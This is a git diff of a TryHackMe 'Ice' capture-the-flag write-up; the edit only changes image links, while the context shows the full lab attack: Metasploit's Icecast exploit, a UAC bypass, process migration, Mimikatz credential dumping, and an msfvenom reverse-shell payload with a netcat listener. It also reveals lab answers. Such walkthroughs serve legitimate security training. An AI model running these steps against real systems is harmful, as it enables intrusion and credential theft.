@@ -1,7 +1,7 @@
 ![Ice Banner](https://i.imgur.com/6Ijftag.png)
 
 <p align="center">
-   <img src="https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/ice/Ice_Cover_2.png" alt="Ice Logo">
+   <img src="https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/ice/Ice_Cover_2.png" alt="Ice Logo">
 </p>
 
 # Ice
@@ -36,7 +36,7 @@ For the scan we use the following command:
 
 3. Once the scan completes, we'll see a number of interesting ports open on this machine. As you might have guessed, the firewall has been disabled (with the service completely shutdown), leaving very little to protect this machine. One of the more interesting ports that is open is Microsoft Remote Desktop (MSRDP). What port is this open on?
 
-   ![Nmap Scan](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/ice/Recon_Nmap_Scan.png)
+   ![Nmap Scan](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/ice/Recon_Nmap_Scan.png)
    
    Here we find the port for the RDP service. Do some research if any services seem unclear.
 
@@ -62,7 +62,7 @@ For the scan we use the following command:
 
    To find this answer we need to search for icecast on the provided webpage. There we can find more information about the vulnerabiliy.
    
-   ![CVE Type](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/ice/Access_CVE_Type.png)
+   ![CVE Type](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/ice/Access_CVE_Type.png)
 
    ><details><summary>Click for answer</summary>execute code overflow</details>
 
@@ -78,7 +78,7 @@ For the scan we use the following command:
 
    Using the command `search icecast` we can look for any modules we can use on this machine.
    
-   ![MSF Modules](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/ice/Access_MSF_Module.png)
+   ![MSF Modules](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/ice/Access_MSF_Module.png)
 
    ><details><summary>Click for answer</summary>exploit/windows/http/icecast_header</details>
 
@@ -88,7 +88,7 @@ For the scan we use the following command:
 
    Now type `use exploit/windows/http/icecast_header` to select this module and the type `options` to view all options and see which we need to change.
    
-   ![MSF Options](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/ice/Access_MSF_Options.png)
+   ![MSF Options](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/ice/Access_MSF_Options.png)
 
    ><details><summary>Click for answer</summary>rhosts</details>
 
@@ -102,7 +102,7 @@ set rhosts 10.10.190.137
 
 After checking the remaining options we can type `run` or `exploit` to run the exploit.
 
-![MSF Run Exploit](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/ice/Access_MSF_Run.png)
+![MSF Run Exploit](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/ice/Access_MSF_Run.png)
 
 ### Escalate
 
@@ -118,7 +118,7 @@ In this task we will be escalting our priveleges on the target machine.
    
    To get the user the is running the Icecast process we can use the `getuid` command.
    
-   ![User ID](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/ice/Escalate_User_ID.png)
+   ![User ID](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/ice/Escalate_User_ID.png)
 
    ><details><summary>Click for answer</summary>Dark</details>
 
@@ -126,7 +126,7 @@ In this task we will be escalting our priveleges on the target machine.
 
    To get more information on the system we can use the `sysinfo` command.
    
-   ![Sysinfo](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/ice/Escalate_Sys_Info.png)
+   ![Sysinfo](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/ice/Escalate_Sys_Info.png)
 
    ><details><summary>Click for answer</summary>7601</details>
 
@@ -156,7 +156,7 @@ In this task we will be escalting our priveleges on the target machine.
    
    Then run the exploit using `run` or `exploit`.
    
-   ![Run Suggester Module](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/ice/Escalate_Suggester.png)
+   ![Run Suggester Module](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/ice/Escalate_Suggester.png)
 
    ><details><summary>Click for answer</summary>exploit/windows/local/bypassuac_eventvwr</details>
 
@@ -166,7 +166,7 @@ In this task we will be escalting our priveleges on the target machine.
 
 In our case we type `use exploit/windows/local/bypassuac_eventvwr`.
 
-![Use Module](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/ice/Escalate_Use_Module.png)
+![Use Module](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/ice/Escalate_Use_Module.png)
 
 *Local exploits require a session to be selected (something we can verify with the command `show options`), set this now using the command `set session SESSION_NUMBER`*
 
@@ -174,7 +174,7 @@ In our case we type `use exploit/windows/local/bypassuac_eventvwr`.
 
    To set the options we type `options` to view them.
    
-   ![Set Options](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/ice/Escalate_Set_Options.png)
+   ![Set Options](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/ice/Escalate_Set_Options.png)
 
    ><details><summary>Click for answer</summary>LHOST</details>
 
@@ -184,7 +184,7 @@ In our case we type `use exploit/windows/local/bypassuac_eventvwr`.
 
 Using `run` or `exploit` we can now run this module to escalate our priveleges.
 
-![Run Module](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/ice/Escalate_Run_Module.png)
+![Run Module](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/ice/Escalate_Run_Module.png)
 
 *Following completion of the privilege escalation a new session will be opened. Interact with it now using the command `sessions SESSION_NUMBER`*
 
@@ -194,7 +194,7 @@ In our case this wasn't necessary as we already spawned into the correct session
 
    Using `getprivs` in the meterpreter shell we can get a list of our priveleges.
    
-   ![Priveleges](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/ice/Escalate_Run_Module.png)
+   ![Priveleges](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/ice/Escalate_Run_Module.png)
    
    ><details><summary>Click for answer</summary>SeTakeOwnershipPrivilege</details>
 
@@ -208,7 +208,7 @@ In this task we will gather additional information and credentials from our mach
 
    Using `ps` in our meterpreter session we get a list of all running processes on the machine.
    
-   ![Running Processes](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/ice/Looting_Processes.png)
+   ![Running Processes](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/ice/Looting_Processes.png)
 
    ><details><summary>Click for answer</summary>spoolsv.exe</details>
 
@@ -222,13 +222,13 @@ To migrate our procces into another process with higher priveleges (spoolsv.exe 
 migrate -N spoolsv.exe
 ```
 
-![Migrate Process](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/ice/Looting_Migrate.png)
+![Migrate Process](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/ice/Looting_Migrate.png)
 
 4. Let's check what user we are now with the command `getuid`. What user is listed?
 
    To check if this worked we use `getuid` again to check which user we are running as now.
    
-   ![Second Get Uid](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/ice/Looting_Current_User.png)
+   ![Second Get Uid](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/ice/Looting_Current_User.png)
 
    ><details><summary>Click for answer</summary>NT AUTHORITY\SYSTEM</details>
 
@@ -236,7 +236,7 @@ migrate -N spoolsv.exe
 
 Loading the Mimkatz extension we can use `load kiwi`.
 
-![Load Mimikatz](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/ice/Looting_Kiwi.png)
+![Load Mimikatz](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/ice/Looting_Kiwi.png)
 
 *Loading kiwi into our meterpreter session will expand our help menu, take a look at the newly added section of the help menu now via the command `help`.*
 
@@ -250,7 +250,7 @@ Loading the Mimkatz extension we can use `load kiwi`.
 
    Run the command with `creds_all`.
    
-   ![Credentials](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/ice/Looting_Passwords.png)
+   ![Credentials](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/ice/Looting_Passwords.png)
 
    ><details><summary>Click for answer</summary>Password01</details>
 
@@ -288,7 +288,7 @@ All questions below can be found in the help section for MetaSploit.
 
 Since we have the credentials we can log into the system. We saw from the `ps` command that the RDP service has already been started. With Reminna we can remote login to the machine.
 
-![RDP Connection](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/ice/Post_Exploit_Desktop.png)
+![RDP Connection](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/ice/Post_Exploit_Desktop.png)
 
 ### Extra Credit
 
@@ -306,11 +306,11 @@ In this optional task we can try to exploit the vulnerability manually with the 
    msfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp LHOST=10.18.78.136 LPORT=443 -b '\x0a\x0d\x00' -f c
    ```
    
-   ![Shellcode](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/ice/Extra_Shellcode.png)
+   ![Shellcode](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/ice/Extra_Shellcode.png)
    
    The resulting code snipper can be copied into our script.
    
-   ![Script](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/ice/Extra_Script.png)
+   ![Script](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/ice/Extra_Script.png)
    
    Now that we have our finished script, we must compile it using `gcc`. After that, we should make the script executable with `chmod`.
    
@@ -319,7 +319,7 @@ In this optional task we can try to exploit the vulnerability manually with the 
    chmod +x 575
    ```
    
-   ![Compile](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/ice/Extra_Compile.png)
+   ![Compile](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/ice/Extra_Compile.png)
    
    The last last to take before executing the script is to set up a listener on the specified port using `netcat`.
    
@@ -333,8 +333,8 @@ In this optional task we can try to exploit the vulnerability manually with the 
    ./575 10.10.170.150
    ```
    
-   ![Run Script](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/ice/Extra_Run_Script.png)
+   ![Run Script](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/ice/Extra_Run_Script.png)
    
-   ![Access](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/ice/Extra_Access.png)
+   ![Access](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/ice/Extra_Access.png)
 
 I will leave the escalation part for another time. For now I feel like I have done enough. The mentioned youtube video also goes through the steps to ecsalte your priveleges.
